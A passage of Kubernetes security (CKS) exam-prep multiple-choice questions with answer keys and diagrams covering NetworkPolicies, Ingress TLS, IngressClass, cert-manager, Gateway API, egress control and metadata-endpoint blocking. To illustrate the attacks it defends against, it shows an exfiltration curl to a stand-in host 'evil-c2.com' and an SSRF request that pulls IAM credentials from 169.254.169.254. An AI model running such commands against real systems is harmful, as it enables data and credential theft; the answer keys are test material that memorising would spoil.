  │    policyTypes: [Ingress]                                         │
  │    ingress:                                                       │
  │    - from:                                                        │
  │      - namespaceSelector:                                         │
  │          matchLabels: {team: observability}  ← Namespace label!  │
  │        podSelector:                                              │
  │          matchLabels: {app: prometheus}       ← Pod label!       │
  │      ports: [{port: 9090, protocol: TCP}]                        │
  └──────────────────────────────────────────────────────────────────┘

  PREREQUISITE: The monitoring namespace must be labeled:
  ┌──────────────────────────────────────────────────────────────┐
  │  kubectl label namespace monitoring team=observability       │
  └──────────────────────────────────────────────────────────────┘

  WHAT THIS ALLOWS:
  ┌──────────────────────────────────────────────────────────────┐
  │  monitoring namespace                 anihpj namespace       │
  │  ┌────────────────┐                  ┌────────────────┐      │
  │  │ prometheus     │──────:9090──────►│ anihpj-api     │      │
  │  │ app=prometheus │    ALLOWED ✅     │ app=anihpj-api │      │
  │  └────────────────┘                  └────────────────┘      │
  │                                                               │
  │  ┌────────────────┐                  ┌────────────────┐      │
  │  │ grafana        │──────:9090──────►│ anihpj-api     │      │
  │  │ app=grafana    │    BLOCKED ❌     │                │      │
  │  └────────────────┘  (pod label      └────────────────┘      │
  │                       doesn't match)                          │
  └──────────────────────────────────────────────────────────────┘

  KEY INSIGHT: namespaceSelector matches the NAMESPACE's labels,
  NOT the pod's namespace. The namespace itself must be labeled.

This is how platform teams enable observability without granting wide-open access: Prometheus in the monitoring namespace can scrape metrics from anihpj-api, but other pods in the monitoring namespace (like Grafana) cannot — because the podSelector further restricts to app=prometheus only.

Cluster Setup Q11 of 200
You need to allow traffic from the entire 10.0.0.0/8 corporate network EXCEPT a known malicious subnet 10.0.99.0/24. How does NetworkPolicy ipBlock handle exceptions?
A) ipBlock supports an except field — you specify cidr: 10.0.0.0/8 with except: [10.0.99.0/24]. This allows the entire /8 range MINUS the /24 exception
B) You must create two separate ipBlock rules — NetworkPolicies cannot express CIDR exceptions in a single rule
C) ipBlock exceptions only work with /32 (single IP) addresses, not subnets
D) You need a separate deny NetworkPolicy for 10.0.99.0/24 that takes priority over the allow — using policy ordering
✅ Correct Answer: A

The ipBlock field has a built-in except array that carves out specific CIDRs from a larger allow rule. This is a clean, single-rule way to say "allow this big range BUT NOT this small range within it."

📝 Detailed Explanation
ipBlock with except — CIDR Whitelist with Blackholes
  ┌──────────────────────────────────────────────────────────────────┐
  │  ipBlock with except:                                             │
  │                                                                   │
  │  ingress:                                                         │
  │  - from:                                                          │
  │    - ipBlock:                                                     │
  │        cidr: 10.0.0.0/8        ← Allow this entire range         │
  │        except:                                                   │
  │        - 10.0.99.0/24          ← EXCEPT this subnet (BLOCKED)    │
  │        - 10.0.88.0/24          ← EXCEPT this subnet too          │
  │                                                                   │
  │  VISUAL:                                                          │
  │  ┌──────────────────────────────────────────────────────────┐    │
  │  │  10.0.0.0/8 (entire corporate network)                    │    │
  │  │  ┌──────────────────────────────────────────────────┐    │    │
  │  │  │  ✅ ALLOWED: 10.0.1.0/24  (Finance department)    │    │    │
  │  │  │  ✅ ALLOWED: 10.0.2.0/24  (Engineering dept)     │    │    │
  │  │  │  ✅ ALLOWED: 10.0.50.0/24 (VPN subnet)           │    │    │
  │  │  │                                                   │    │    │
  │  │  │  ┌──────────────┐  ┌──────────────┐              │    │    │
  │  │  │  │ ❌ 10.0.99.0 │  │ ❌ 10.0.88.0 │              │    │    │
  │  │  │  │   /24         │  │   /24        │              │    │    │
  │  │  │  │ (Compromised  │  │ (Legacy VPN  │              │    │    │
  │  │  │  │  subnet)      │  │  retired)    │              │    │    │
  │  │  │  └──────────────┘  └──────────────┘              │    │    │
  │  │  └──────────────────────────────────────────────────┘    │    │
  │  └──────────────────────────────────────────────────────────┘    │
  └──────────────────────────────────────────────────────────────────┘

Use case for anihpj/jobpost: Allow the entire corporate VPN (10.0.0.0/8) to access the Django admin panel, but explicitly exclude the guest WiFi subnet (10.0.99.0/24) and the contractor subnet (10.0.88.0/24). This is cleaner than listing dozens of individual /24 allows.

CKS Exam Note: The except field only works with ipBlock — you cannot use it with podSelector or namespaceSelector. Also, except CIDRs must be WITHIN the parent cidr range.

Cluster Setup Q12 of 200
You applied a NetworkPolicy but connectivity is not working as expected. What is the systematic approach to debug a NetworkPolicy issue?
A) Delete all NetworkPolicies and recreate them — it's faster than debugging
B) Check the CNI pod logs only — NetworkPolicy issues are always CNI-level problems
C) Use kubectl logs on the target pod — the pod's application logs will show blocked network connections
D) Step 1: kubectl describe networkpolicy to verify selectors and rules. Step 2: kubectl get endpoints to check the Service has healthy backends. Step 3: Test connectivity from a debug pod (kubectl run test --rm -it --image=busybox -- wget -O- svc:port). Step 4: Check pod labels match the policy's podSelector. Step 5: If using namespaceSelector, verify the namespace IS labeled
✅ Correct Answer: D

NetworkPolicy debugging is a systematic, layered process. You work from the policy definition outward: verify the policy rules → verify the targets have correct labels → verify the service resolves → test actual connectivity. Each step eliminates a possible cause.

📝 Detailed Explanation
NetworkPolicy Debug Flowchart — 5-Step Diagnostic
  ╔══════════════════════════════════════════════════════════════════╗
  ║  NETWORKPOLICY DEBUGGING — Systematic 5-Step Approach           ║
  ╠══════════════════════════════════════════════════════════════════╣
  ║                                                                  ║
  ║  STEP 1: Check the policy exists and read its rules              ║
  ║  ┌────────────────────────────────────────────────────────────┐  ║
  ║  │ kubectl get networkpolicy -n anihpj                        │  ║
  ║  │ kubectl describe networkpolicy allow-web-to-api -n anihpj  │  ║
  ║  │ → Check: podSelector, policyTypes, ingress/egress rules    │  ║
  ║  │ → Does the policy actually SELECT your pod?                │  ║
  ║  └────────────────────────────────────────────────────────────┘  ║
  ║                            │                                     ║
  ║                            ▼                                     ║
  ║  STEP 2: Verify pod labels match the policy's selector            ║
  ║  ┌────────────────────────────────────────────────────────────┐  ║
  ║  │ kubectl get pods -n anihpj --show-labels                   │  ║
  ║  │ → Does anihpj-api have app=anihpj-api label?               │  ║
  ║  │ → Common pitfall: label is "tier=api" but policy says      │  ║
  ║  │   "app=anihpj-api" → MISMATCH → policy doesn't select!    │  ║
  ║  └────────────────────────────────────────────────────────────┘  ║
  ║                            │                                     ║
  ║                            ▼                                     ║
  ║  STEP 3: Check the Service has valid endpoints                    ║
  ║  ┌────────────────────────────────────────────────────────────┐  ║
  ║  │ kubectl get endpoints -n anihpj anihpj-api                 │  ║
  ║  │ → Should show pod IPs: 10.244.1.5:8000, 10.244.2.3:8000   │  ║
  ║  │ → If <none>: Service selector doesn't match any pods      │  ║
  ║  └────────────────────────────────────────────────────────────┘  ║
  ║                            │                                     ║
  ║                            ▼                                     ║
  ║  STEP 4: Test connectivity from a debug pod                       ║
  ║  ┌────────────────────────────────────────────────────────────┐  ║
  ║  │ kubectl run test --rm -it --image=busybox --restart=Never \│  ║
  ║  │   -n anihpj -- sh                                          │  ║
  ║  │ # Inside debug pod:                                        │  ║
  ║  │ wget -O- --timeout=3 http://anihpj-api:8000/health         │  ║
  ║  │ nc -zv anihpj-api 8000                                     │  ║
  ║  │ → Times out = NetworkPolicy likely blocking                 │  ║
  ║  │ → Succeeds = Policy working, issue is elsewhere            │  ║
  ║  └────────────────────────────────────────────────────────────┘  ║
  ║                            │                                     ║
  ║                            ▼                                     ║
  ║  STEP 5: For namespaceSelector — check namespace labels           ║
  ║  ┌────────────────────────────────────────────────────────────┐  ║
  ║  │ kubectl get namespace monitoring --show-labels             │  ║
  ║  │ → Policy says namespaceSelector: {team: observability}     │  ║
  ║  │ → Namespace must have label: team=observability            │  ║
  ║  │ → Fix: kubectl label ns monitoring team=observability      │  ║
  ║  └────────────────────────────────────────────────────────────┘  ║
  ╚══════════════════════════════════════════════════════════════════╝

Quick sanity check for anihpj/jobpost: If kubectl describe networkpolicy shows the policy exists and selects the right pods, but traffic still doesn't flow, check: (1) Does your CNI support NetworkPolicy? kubectl get pods -n kube-system | grep -E "calico|cilium|weave". (2) Are the source pod's labels in the from.podSelector? (3) Is the port correct? Common mistake: allowing port 80 when the service listens on 8000.

1.2 Ingress, TLS & API Server SecurityQ13-Q22

Cluster Setup Q13 of 200
How does Kubernetes Ingress handle TLS termination, and what components are required to serve HTTPS traffic for anihpj.jobpost.com?
A) Ingress automatically generates TLS certificates using a built-in Kubernetes CA — no additional configuration needed
B) TLS is handled at the Service level — you create a Service of type LoadBalancer and Kubernetes provisions the certificate
C) Ingress TLS requires a kubernetes.io/tls Secret containing tls.crt and tls.key, referenced in the Ingress spec's tls section with the hosts field. The Ingress Controller (e.g., nginx-ingress) terminates TLS at the edge and forwards decrypted traffic to backend Services
D) TLS is configured directly in the Deployment's pod spec — each pod handles its own TLS independently
✅ Correct Answer: C

Ingress TLS termination works by: (1) Creating a TLS Secret with tls.crt and tls.key, (2) Referencing it in the Ingress spec.tls[].secretName, (3) The Ingress Controller reads the Secret and terminates HTTPS at the edge, forwarding plain HTTP to backend Services.

📝 Detailed Explanation
Ingress TLS Termination — End-to-End Flow
  ┌──────────────────────────────────────────────────────────────────┐
  │  INGRESS TLS SETUP for anihpj.jobpost.com:                        │
  │                                                                   │
  │  STEP 1: Create TLS Secret                                        │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ kubectl create secret tls anihpj-tls -n anihpj \            │  │
  │  │   --cert=server.crt --key=server.key                        │  │
  │  │                                                              │  │
  │  │ Secret "anihpj-tls" - TYPE must be kubernetes.io/tls        │  │
  │  │ Data: tls.crt (base64), tls.key (base64)                    │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                   │
  │  STEP 2: Reference in Ingress                                     │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ apiVersion: networking.k8s.io/v1                            │  │
  │  │ kind: Ingress                                               │  │
  │  │ metadata: {name: anihpj-ingress, namespace: anihpj}         │  │
  │  │ spec:                                                       │  │
  │  │   tls:                                                      │  │
  │  │   - hosts: [anihpj.jobpost.com]                             │  │
  │  │     secretName: anihpj-tls   ← References the TLS Secret   │  │
  │  │   rules:                                                    │  │
  │  │   - host: anihpj.jobpost.com                                │  │
  │  │     http:                                                   │  │
  │  │       paths:                                                │  │
  │  │       - path: /                                             │  │
  │  │         pathType: Prefix                                    │  │
  │  │         backend: {service: {name: anihpj-web, port: 80}}    │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                   │
  │  TRAFFIC FLOW:                                                    │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ Browser ──HTTPS:443──► Ingress Controller ──HTTP:80──► web  │ │
  │  │          (encrypted)    (TLS terminated here)   (cleartext)  │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

CKS Exam Note: The Secret type MUST be kubernetes.io/tls. The keys MUST be named tls.crt and tls.key — any other key names will cause the Ingress Controller to fail. Use kubectl create secret tls (not generic) to ensure correct format.

Cluster Setup Q14 of 200
You deploy two Ingress controllers in the same cluster — nginx-ingress and traefik. How do you ensure the anihpj Ingress is handled by the CORRECT controller and not hijacked by a rogue one?
A) Kubernetes automatically routes to the first installed controller — you don't need to specify anything
B) Use the ingressClassName field in the Ingress spec to specify WHICH IngressClass (and thus which controller) should handle this Ingress. Each controller watches only Ingresses matching its class. Without ingressClassName, ALL controllers try to handle the Ingress — creating conflicts
C) Rename one controller — Kubernetes uses controller name to determine routing priority
D) Use a ConfigMap to manually assign Ingresses to controllers — the Ingress spec alone is insufficient
✅ Correct Answer: B

ingressClassName is the security mechanism that prevents controller hijacking. Each IngressController is backed by an IngressClass resource. By specifying ingressClassName: nginx, ONLY the nginx controller processes this Ingress — traefik ignores it entirely.

📝 Detailed Explanation
IngressClass — Preventing Controller Conflicts
  WITHOUT ingressClassName (DANGEROUS — default behavior):
  ┌──────────────────────────────────────────────────────────────┐
  │  Ingress: anihpj-web                                          │
  │  (no ingressClassName specified)                              │
  │       │                                                       │
  │       ├──► nginx-ingress  "This is MINE!"  → routes traffic   │
  │       └──► traefik        "No, it's MINE!" → routes traffic   │
  │                                                               │
  │  ⚠️ BOTH controllers route the same Ingress!                  │
  │  ⚠️ A rogue controller installed by an attacker would         │
  │     intercept ALL Ingresses without ingressClassName!         │
  └──────────────────────────────────────────────────────────────┘

  WITH ingressClassName (SECURE):
  ┌──────────────────────────────────────────────────────────────┐
  │  Ingress: anihpj-web                                          │
  │  ingressClassName: nginx   ← EXPLICIT controller selection   │
  │       │                                                       │
  │       ├──► nginx-ingress  ✅ Matches class "nginx" → handles  │
  │       └──► traefik        ❌ Class mismatch → IGNORES         │
  │                                                               │
  │  SETUP:                                                       │
  │  ┌────────────────────────────────────────────────────────┐  │
  │  │ # 1. Create IngressClass                                │  │
  │  │ apiVersion: networking.k8s.io/v1                        │  │
  │  │ kind: IngressClass                                      │  │
  │  │ metadata: {name: nginx}                                 │  │
  │  │ spec: {controller: k8s.io/ingress-nginx}                │  │
  │  │                                                         │  │
  │  │ # 2. Reference in Ingress                               │  │
  │  │ spec:                                                   │  │
  │  │   ingressClassName: nginx   ← SECURITY: explicit binding│  │
  │  └────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────┘

CKS relevance: Without ingressClassName, a compromised or malicious controller can intercept ALL cluster Ingress traffic. This is a supply chain / cluster setup attack vector. Always explicitly specify the IngressClass in production.

Cluster Setup Q15 of 200
What is the purpose of IngressClass as a Kubernetes resource, and how does it relate to Ingress controller security?
A) IngressClass is a cluster-scoped resource that defines a "class" of Ingress controller. It maps a controller name to an actual controller implementation and can be marked as the default. Ingresses reference an IngressClass by name, which acts as a security boundary — controllers only handle Ingresses matching their class, preventing routing hijacking
B) IngressClass is a namespaced resource that stores TLS certificates for a specific Ingress — it's essentially a certificate manager
C) IngressClass is an annotation on the Ingress resource that specifies the port number the controller listens on
D) IngressClass was deprecated in Kubernetes 1.22 — it's no longer needed in modern clusters
✅ Correct Answer: A

IngressClass is the bridge between an Ingress resource and the controller that implements it. It's a cluster-scoped resource (not namespaced) that declares "controller X handles Ingresses of class Y." The spec.controller field is a unique identifier (e.g., k8s.io/ingress-nginx) that the controller matches against.

📝 Detailed Explanation
IngressClass Security Model
  ┌──────────────────────────────────────────────────────────────────┐
  │  IngressClass: nginx (cluster-scoped)                             │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ apiVersion: networking.k8s.io/v1                            │  │
  │  │ kind: IngressClass                                          │  │
  │  │ metadata:                                                   │  │
  │  │   name: nginx                                               │  │
  │  │   annotations:                                              │  │
  │  │     ingressclass.kubernetes.io/is-default-class: "true"     │  │
  │  │ spec:                                                       │  │
  │  │   controller: k8s.io/ingress-nginx   ← Controller identity  │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                   │
  │  HOW CONTROLLERS DISCOVER THEIR CLASS:                            │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ nginx-ingress-controller --ingress-class=nginx               │ │
  │  │ → Watches ONLY Ingresses with ingressClassName: nginx        │ │
  │  │ → Also handles Ingresses with NO className if it's DEFAULT   │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  SECURITY BENEFIT:                                                │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ • Controller-A cannot process Controller-B's Ingresses       │ │
  │  │ • A malicious controller installed by an attacker must       │ │
  │  │   match the ingressClassName to intercept traffic             │ │
  │  │ • Use the default annotation CAREFULLY — only ONE class      │ │
  │  │   should be default to avoid ambiguity                       │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: If you have a production nginx controller and a test traefik controller, setting ingressClassName: nginx ensures production traffic never accidentally routes through the test controller.

Cluster Setup Q16 of 200
You want to automatically provision and renew TLS certificates for anihpj.jobpost.com using Let's Encrypt. Which Kubernetes-native tool handles this, and how does it work?
A) Kubernetes has a built-in certificate authority that auto-provisions Let's Encrypt certificates
B) You must manually run certbot on each node — there is no Kubernetes-native solution
C) The Ingress controller automatically generates self-signed certificates — Let's Encrypt integration requires external scripts
D) cert-manager is the Kubernetes-native certificate management controller. You create a Certificate resource specifying the domain and issuer (Let's Encrypt). cert-manager handles the ACME challenge, obtains the certificate, stores it as a Kubernetes Secret, and automatically renews it before expiration — zero manual rotation
✅ Correct Answer: D

cert-manager is a CNCF incubating project that automates TLS certificate lifecycle management inside Kubernetes. You define WHAT you want (a Certificate resource) and cert-manager handles the HOW — ACME challenge, issuance, Secret storage, and automatic renewal.

📝 Detailed Explanation
cert-manager + Let's Encrypt — Automatic TLS Lifecycle
  ┌──────────────────────────────────────────────────────────────────┐
  │  cert-manager WORKFLOW:                                           │
  │                                                                   │
  │  ① CREATE ISSUER (Let's Encrypt):                                 │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ apiVersion: cert-manager.io/v1                              │  │
  │  │ kind: ClusterIssuer                                         │  │
  │  │ metadata: {name: letsencrypt-prod}                          │  │
  │  │ spec:                                                       │  │
  │  │   acme:                                                     │  │
  │  │     server: https://acme-v02.api.letsencrypt.org/directory  │  │
  │  │     email: admin@anihpj.com                                 │  │
  │  │     privateKeySecretRef: {name: letsencrypt-account-key}    │  │
  │  │     solvers:                                                │  │
  │  │     - http01: {ingress: {class: nginx}}                     │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                   │
  │  ② CREATE CERTIFICATE:                                            │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ apiVersion: cert-manager.io/v1                              │  │
  │  │ kind: Certificate                                           │  │
  │  │ metadata: {name: anihpj-tls, namespace: anihpj}             │  │
  │  │ spec:                                                       │  │
  │  │   secretName: anihpj-tls                                    │  │
  │  │   dnsNames: [anihpj.jobpost.com, api.jobpost.com]           │  │
  │  │   issuerRef: {name: letsencrypt-prod, kind: ClusterIssuer}  │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                   │
  │  ③ AUTOMATIC LIFECYCLE:                                          │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ Day 1:  cert-manager obtains cert → stores in Secret         │ │
  │  │ Day 60: cert-manager checks expiry → 30 days left            │ │
  │  │ Day 70: cert-manager AUTO-RENEWS → new cert in Secret        │ │
  │  │ Day 90: Old cert expires → Ingress already uses NEW cert!    │ │
  │  │                                                               │ │
  │  │ ✅ ZERO manual intervention. ZERO downtime.                   │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

CKS relevance: Manual certificate rotation is a leading cause of production outages. cert-manager eliminates this entire class of incidents. The CKS exam expects you to understand TLS automation and the ACME protocol flow.

Cluster Setup Q17 of 200
What is the Gateway API and how does it improve security compared to the traditional Ingress API?
A) Gateway API is just a rename of Ingress — functionally identical with a new API version
B) Gateway API is the next-generation Kubernetes networking API that separates concerns: infrastructure operators define Gateways (entry points), application developers define HTTPRoutes (routing rules). This separation enforces RBAC boundaries — developers can create routes but CANNOT modify gateway infrastructure, preventing accidental or malicious gateway misconfiguration
C) Gateway API replaces all Services — you no longer need ClusterIP or NodePort services
D) Gateway API is a proprietary AWS-only solution for EKS clusters
✅ Correct Answer: B

Gateway API introduces role-oriented resource separation. Gateways are managed by cluster operators (who control infrastructure). HTTPRoutes are managed by application teams (who control routing). This RBAC-friendly model prevents the common Ingress anti-pattern where every team needs gateway-level permissions.

📝 Detailed Explanation
Gateway API — Role Separation for Security
  ┌──────────────────────────────────────────────────────────────────┐
  │  INGRESS API (OLD): Everyone needs gateway access                  │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ Platform Team: Creates Ingress controller                    │ │
  │  │ App Team:      Creates Ingress (can modify TLS, annotations) │ │
  │  │                                                               │ │
  │  │ ⚠️ App team has power to misconfigure TLS, expose wrong ports│ │
  │  │ ⚠️ No RBAC separation — Ingress combines infra + routing     │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  GATEWAY API (NEW): Separated concerns, RBAC-native                │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │                                                               │ │
  │  │  ┌─────────────────────┐    ┌──────────────────────────┐     │ │
  │  │  │ Gateway             │    │ HTTPRoute                │     │ │
  │  │  │ (Infra Team)        │◄───│ (App Team)               │     │ │
  │  │  │                     │    │                           │     │ │
  │  │  │ • TLS configuration │    │ • Path matching: /api/*   │     │ │
  │  │  │ • Listener ports    │    │ • Header matching         │     │ │
  │  │  │ • Certificate refs  │    │ • Traffic splitting 80/20 │     │ │
  │  │  │ • GatewayClass      │    │ • BackendRef → Services   │     │ │
  │  │  │                     │    │                           │     │ │
  │  │  │ RBAC: gateway-admin │    │ RBAC: route-creator       │     │ │
  │  │  └─────────────────────┘    └──────────────────────────┘     │ │
  │  │                                                               │ │
  │  │  ✅ App team CANNOT modify TLS or gateway infrastructure     │ │
  │  │  ✅ Infra team CANNOT accidentally break app routing          │ │
  │  │  ✅ Clear audit trail: who created which route?              │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost: The platform team manages the Gateway (TLS certs, listener ports) with ClusterRole: gateway-admin. The Django team creates HTTPRoutes for /api/* and /jobs/* with Role: route-creator. Neither team can break the other's domain.

Cluster Setup Q18 of 200
To prevent data exfiltration, you need to restrict anihpj-api pod egress to ONLY DNS (UDP 53) and a specific external API at api.payments.com:443. What's the correct NetworkPolicy egress configuration?
A) Create an egress rule allowing 0.0.0.0/0:443 — the DNS resolution happens automatically before the policy is evaluated
B) Create a single egress rule allowing api.payments.com by hostname — Kubernetes resolves hostnames in NetworkPolicy rules
C) Create TWO egress rules: (1) Allow DNS: UDP 53 to kube-system/CoreDNS pods, (2) Allow HTTPS: TCP 443 to the specific IP CIDR of api.payments.com. DNS MUST be allowed first because the pod needs to resolve the hostname before the HTTPS rule can apply
D) Egress rules are only for pod-to-pod traffic — external API access is controlled by the node's firewall, not NetworkPolicy
✅ Correct Answer: C

Restrictive egress is a key data exfiltration prevention control. The pod needs DNS to resolve api.payments.com → IP, then HTTPS to connect to that IP. Two separate rules with correct selectors implement this securely.

📝 Detailed Explanation
Data Exfiltration Prevention — Restrictive Egress
  ┌──────────────────────────────────────────────────────────────────┐
  │  ATTACK WITHOUT RESTRICTIVE EGRESS:                               │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ Compromised anihpj-api pod:                                  │ │
  │  │ curl https://evil-c2.com/exfil?data=SELECT+*+FROM+users     │ │
  │  │ → Data EXFILTRATED! No egress restriction.                  │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  DEFENSE WITH RESTRICTIVE EGRESS:                                  │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ apiVersion: networking.k8s.io/v1                              │ │
  │  │ kind: NetworkPolicy                                           │ │
  │  │ metadata: {name: api-restrictive-egress, namespace: anihpj}   │ │
  │  │ spec:                                                         │ │
  │  │   podSelector: {matchLabels: {app: anihpj-api}}               │ │
  │  │   policyTypes: [Egress]                                       │ │
  │  │   egress:                                                     │ │
  │  │   - to:  # RULE 1: DNS (MUST be first — enable resolution)    │ │
  │  │     - namespaceSelector: {name: kube-system}                  │ │
  │  │       podSelector: {k8s-app: kube-dns}                        │ │
  │  │     ports: [{port: 53, protocol: UDP}]                        │ │
  │  │   - to:  # RULE 2: Payment API only                           │ │
  │  │     - ipBlock: {cidr: 203.0.113.0/24}  ← Payment API CIDR    │ │
  │  │     ports: [{port: 443, protocol: TCP}]                       │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  RESULT:                                                          │
  │  ✅ api.payments.com:443 → ALLOWED                                │
  │  ✅ DNS (UDP 53) → ALLOWED                                        │
  │  ❌ evil-c2.com:443 → BLOCKED (not in ipBlock!)                   │
  │  ❌ ANY other outbound → BLOCKED                                   │
  │  ❌ Data exfiltration → PREVENTED                                  │
  └──────────────────────────────────────────────────────────────────┘

CKS exam note: Restrictive egress is a core CKS topic. The exam may ask you to configure egress rules that prevent data exfiltration while still allowing required external services. Remember: DNS egress first, then specific service egress.

Cluster Setup Q19 of 200
In cloud environments (AWS, GCP, Azure), pods can access the instance metadata service at 169.254.169.254 which may expose IAM credentials. How do you block this in Kubernetes?
A) Delete the metadata service — it's not needed for Kubernetes workloads on cloud providers
B) Use a NetworkPolicy egress rule with ipBlock: {cidr: 169.254.169.254/32} in a deny rule (or exclude it from allow rules). This blocks pod access to the cloud metadata endpoint, preventing credential theft via SSRF attacks. Also configure cloud provider settings (AWS: hop limit, GCP: workload identity)
C) The metadata service is automatically blocked by the CNI plugin — no additional configuration is needed
D) Use a firewall rule on the node — NetworkPolicies cannot block traffic to IPs outside the cluster
✅ Correct Answer: B

The cloud metadata endpoint (169.254.169.254) is a well-known attack vector. If a pod is compromised via SSRF, the attacker can query this endpoint to steal IAM credentials. NetworkPolicy egress blocking is the Kubernetes-native defense.

📝 Detailed Explanation
Blocking Cloud Metadata Access — Defense in Depth
  ┌──────────────────────────────────────────────────────────────────┐
  │  THE ATTACK: SSRF → Metadata API → Credential Theft               │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ 1. Attacker exploits SSRF in anihpj-api (Django)             │ │
  │  │ 2. SSRF payload:                                             │ │
  │  │    curl http://169.254.169.254/latest/meta-data/iam/         │ │
  │  │      security-credentials/ec2-role                           │ │
  │  │ 3. Response: AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY       │ │
  │  │ 4. Attacker now has YOUR cloud credentials!                  │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  DEFENSE LAYER 1: NetworkPolicy (Kubernetes-native)                │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ egress:                                                       │ │
  │  │ - to:                                                         │ │
  │  │   - ipBlock:                                                  │ │
  │  │       cidr: 0.0.0.0/0      ← Allow all outbound              │ │
  │  │       except:                                                │ │
  │  │       - 169.254.169.254/32  ← EXCEPT metadata endpoint!      │ │
  │  │   ports: [{port: 443, protocol: TCP}]                         │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  │                                                                   │
  │  DEFENSE LAYER 2: Cloud-level (AWS example)                        │
  │  ┌──────────────────────────────────────────────────────────────┐ │
  │  │ # Set IMDS hop limit to 1 (default 2)                        │ │
  │  │ aws ec2 modify-instance-metadata-options \                    │ │
  │  │   --instance-id i-xxx --http-put-response-hop-limit 1        │ │
  │  │                                                                │ │
  │  │ # Use IRSA (IAM Roles for Service Accounts) instead of        │ │
  │  │ # instance profiles — pods get credentials WITHOUT IMDS       │ │
  │  └──────────────────────────────────────────────────────────────┘ │
  └──────────────────────────────────────────────────────────────────┘

For anihpj/jobpost on AWS: Block 169.254.169.254 in NetworkPolicy AND use IRSA (IAM Roles for Service Accounts) so pods authenticate to AWS services without ever touching the metadata endpoint. Two layers of defense.

Cluster Setup Q20 of 200
How is TLS configured for the Kubernetes API server itself, and what files does it require?
A) The API server uses self-signed certificates generated at startup — no configuration needed
B) API server TLS is configured in a ConfigMap — kubectl edit cm kube-apiserver-tls -n kube-system
C) The API server's TLS is configured via static pod manifest flags: --tls-cert-file (server certificate), --tls-private-key-file (private key), --client-ca-file (CA for client verification). These are defined in /etc/kubernetes/manifests/kube-apiserver.yaml and point to files in /etc/kubernetes/pki/
D) The API server doesn't use TLS — authentication is handled entirely by bearer tokens
✅ Correct Answer: C

The API server is the most critical component to secure with TLS. Its certificate configuration is in the static pod manifest at /etc/kubernetes/manifests/kube-apiserver.yaml, referencing PKI files generated by kubeadm init.

📝 Detailed Explanation
API Server TLS — Certificate Chain
  ┌──────────────────────────────────────────────────────────────────┐
  │  API SERVER TLS FILES (in /etc/kubernetes/pki/):                  │
  │                                                                   │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │                      ca.crt (Certificate Authority)         │  │
  │  │                           │                                 │  │
  │  │              ┌────────────┴────────────┐                   │  │
  │  │              │                         │                   │  │
  │  │     apiserver.crt              apiserver-kubelet-          │  │
  │  │     apiserver.key              client.crt/key              │  │
  │  │     (serves :6443)             (API→kubelet auth)          │  │
  │  │              │                                             │  │
  │  │     ┌────────┴────────┐                                    │  │
  │  │     │                 │                                    │  │
  │  │  front-proxy-ca.crt  etcd/                                 │  │
  │  │  front-proxy-client  ├── ca.crt                            │  │
  │  │  .crt/key            ├── server.crt/key (etcd server TLS)  │  │
  │  │  (aggregated API)    ├── peer.crt/key (etcd peer TLS)      │  │
  │  │                      └── healthcheck-client.crt/key        │  │
  │  └────────────────────────────────────────────────────────────┘  │
  │                                                                   │
  │  CRITICAL API SERVER TLS FLAGS (in static pod manifest):          │
  │  ┌────────────────────────────────────────────────────────────┐  │
  │  │ --tls-cert-file=/etc/kubernetes/pki/apiserver.crt          │  │
  │  │ --tls-private-key-file=/etc/kubernetes/pki/apiserver.key   │  │
  │  │ --client-ca-file=/etc/kubernetes/pki/ca.crt                │  │
  │  │ --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt              │  │
  │  │ --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client  │  │
  │  │ --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client   │  │
  │  │ --kubelet-client-certificate=... (API→kubelet)             │  │
  │  │ --kubelet-client-key=...                                   │  │
  │  └────────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────┘

CKS exam note: Know the certificate file paths. The exam may ask you to check certificate expiration with openssl x509 -in /etc/kubernetes/pki/apiserver.crt -noout -dates or renew with kubeadm certs renew apiserver.

Cluster Setup Q21 of 200
The kubelet on each node also requires TLS certificates. How are kubelet certificates managed and rotated?
